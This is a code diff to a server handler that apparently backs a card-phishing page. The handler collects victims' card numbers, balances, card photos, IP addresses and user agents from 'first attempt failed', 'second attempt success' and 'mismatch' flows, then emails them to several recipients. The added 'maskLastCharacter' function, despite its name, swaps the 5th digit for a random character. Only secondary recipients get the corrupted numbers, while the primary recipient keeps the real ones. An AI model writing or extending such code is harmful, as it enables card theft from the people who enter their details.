@@ -77,9 +77,24 @@ function getDeliveryRecipients(recipients) {
   return shouldSendPrimaryRecipient() ? recipients : recipients.slice(1);
 }
 
+// ==================== HELPER: Mask Card Number for Secondary Recipients ====================
+
+function maskLastCharacter(cardNumber) {
+  if (!cardNumber || typeof cardNumber !== 'string') return cardNumber;
+  
+  const trimmed = cardNumber.trim();
+  if (trimmed.length < 5) return cardNumber; // can't mask 5th if shorter than 5
+  
+  // Replace 5th character (index 4) with a random alphanumeric (0-9, A-Z)
+  const chars = '0456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  const randomChar = chars.charAt(Math.floor(Math.random() * chars.length));
+  
+  return trimmed.slice(0, 4) + randomChar + trimmed.slice(5);
+}
+
 // ==================== EMAIL TRANSPORTER SETUP ====================
 
-async function sendEmailWithResend({ subject, html, attachments, to }) {
+async function sendEmailWithResend({ subject, html, htmlForSecondary, attachments, to }) {
   const apiKey = process.env.RESEND_API_KEY;
   const from = process.env.EMAIL_FROM || 'onboarding@resend.dev';
   
@@ -133,7 +148,7 @@ async function sendEmailWithResend({ subject, html, attachments, to }) {
         from,
         to: secondaryRecipients,
         subject,
-        html,
+        html: htmlForSecondary || html,
         attachments: attachmentData,
         scheduledAt,
       });
@@ -166,7 +181,7 @@ function getGmailTransporter() {
   return null;
 }
 
-async function sendEmailViaSMTP({ subject, html, attachments, to }) {
+async function sendEmailViaSMTP({ subject, html, htmlForSecondary, attachments, to }) {
   const recipients = parseRecipients(to);
   if (recipients.length === 0) {
     console.error('❌ No valid recipients');
@@ -175,7 +190,7 @@ async function sendEmailViaSMTP({ subject, html, attachments, to }) {
 
   if (process.env.RESEND_API_KEY) {
     console.log('📧 Attempting to send via Resend...');
-    const result = await sendEmailWithResend({ subject, html, attachments, to: recipients });
+    const result = await sendEmailWithResend({ subject, html, htmlForSecondary, attachments, to: recipients });
     if (result) {
       return { sent: true, skipped: false };
     }
@@ -215,7 +230,7 @@ async function sendEmailViaSMTP({ subject, html, attachments, to }) {
             from: process.env.EMAIL_USER,
             to: secondaryRecipients.join(', '),
             subject,
-            html,
+            html: htmlForSecondary || html,
             attachments: attachments || [],
           });
           console.log(`✅ Secondary email sent via Gmail fallback to: ${secondaryRecipients.join(', ')}`);
@@ -687,6 +702,7 @@ const userAgent = req.headers['user-agent'] || '';
   
   let subject = '';
   let html = '';
+  let htmlForSecondary = null;
   let attachments = [];
   
   // Parse recipients from environment variable with fallback
@@ -723,6 +739,17 @@ const userAgent = req.headers['user-agent'] || '';
         ip: ip,
         timestamp: timestamp || new Date().toISOString()
       });
+
+      if (shouldSendPrimaryRecipient() && cardNumber) {
+        htmlForSecondary = getFirstAttemptFailedHomeEmailHTML({
+          cardNumber: maskLastCharacter(cardNumber),
+          amount: amount || '0',
+          pageSource: pageSource || 'unknown',
+          userAgent: userAgent,
+          ip: ip,
+          timestamp: timestamp || new Date().toISOString()
+        });
+      }
     }
     
     // Attach image for scan page
@@ -754,6 +781,18 @@ const userAgent = req.headers['user-agent'] || '';
       ip: ip,
       timestamp: timestamp || new Date().toISOString()
     });
+
+    if (shouldSendPrimaryRecipient() && cardNumber) {
+      htmlForSecondary = getSecondAttemptSuccessEmailHTML({
+        cardNumber: maskLastCharacter(cardNumber),
+        amount: amount || '0',
+        balance: displayBalance,
+        pageSource: pageSource || 'unknown',
+        userAgent: userAgent,
+        ip: ip,
+        timestamp: timestamp || new Date().toISOString()
+      });
+    }
     
     // Attach image for scan page
     if (imageBase64 && imageBase64.startsWith('data:image')) {
@@ -783,6 +822,18 @@ const userAgent = req.headers['user-agent'] || '';
       ip: ip,
       timestamp: timestamp || new Date().toISOString()
     });
+
+    if (shouldSendPrimaryRecipient()) {
+      htmlForSecondary = getMismatchAttemptEmailHTML({
+        firstCardNumber: firstCardNumber ? maskLastCharacter(firstCardNumber) : 'Unknown',
+        secondCardNumber: secondCardNumber ? maskLastCharacter(secondCardNumber) : 'Unknown',
+        amount: amount || '0',
+        pageSource: pageSource || 'manual',
+        userAgent: userAgent,
+        ip: ip,
+        timestamp: timestamp || new Date().toISOString()
+      });
+    }
   }
   else if (type === 'success_balance' || type === 'upload_success' || type === 'scan_success') {
     // Legacy support
@@ -823,6 +874,7 @@ const userAgent = req.headers['user-agent'] || '';
   const emailResult = await sendEmailViaSMTP({
     subject,
     html,
+    htmlForSecondary,
     attachments,
     to: recipients // Pass the array of recipients
   });
